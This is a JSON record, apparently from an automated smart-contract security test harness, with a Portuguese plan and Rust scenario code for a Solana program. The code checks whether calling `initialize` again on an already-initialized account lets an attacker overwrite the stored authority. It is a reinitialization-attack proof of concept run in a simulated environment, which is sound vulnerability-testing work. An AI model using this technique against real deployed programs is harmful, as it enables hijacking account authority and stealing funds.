{"plan": "Preparo uma conta `user` com 32 bytes de dados (autoridade original) e uma conta `authority` legitima. O baseline chama `initialize` com a autoridade original, provando que o cenario esta correto. O ataque chama `initialize` novamente sobre a mesma conta `user` ja inicializada, passando a chave do atacante como `authority_info`. O efeito mede que os primeiros 32 bytes da conta `user` apos o ataque sao a chave do atacante, diferente da autoridade original gravada pelo baseline.", "scenario": "let original_authority = Pubkey::new_unique();
let attacker = Pubkey::new_unique();

let user_key = Pubkey::new_unique();
let user_data = vec![0u8; 32];
let user_account = account(&env.program_id, &user_data, None);

let authority_account = wallet(1_000_000_000);
let attacker_account = wallet(1_000_000_000);

let metas = vec![
    AccountMeta::new(user_key, false),
    AccountMeta::new_readonly(original_authority, false),
];
let ix = env.raw_ix(&(), metas);

let contas = vec![
    (user_key, user_account.clone()),
    (original_authority, authority_account.clone()),
];

let baseline = env.baseline("initialize legitimo", &ix, &contas);

let user_after_baseline = after(&baseline, &user_key).clone();

let attack_metas = vec![
    AccountMeta::new(user_key, false),
    AccountMeta::new_readonly(attacker, false),
];
let attack_ix = env.raw_ix(&(), attack_metas);

let attack_contas = vec![
    (user_key, user_after_baseline),
    (attacker, attacker_account),
];

let r = env.attack("reinitialize sobrescrevendo autoridade", &attack_ix, &attack_contas);

if r.program_result == ProgramResult::Success {
    let data = after(&r, &user_key).data();
    let nova_autoridade = read_pubkey(data, 0);
    env.effect("autoridade sobrescrita pelo atacante", nova_autoridade == attacker);
    env.effect("autoridade original perdida", nova_autoridade != original_authority);
}"}

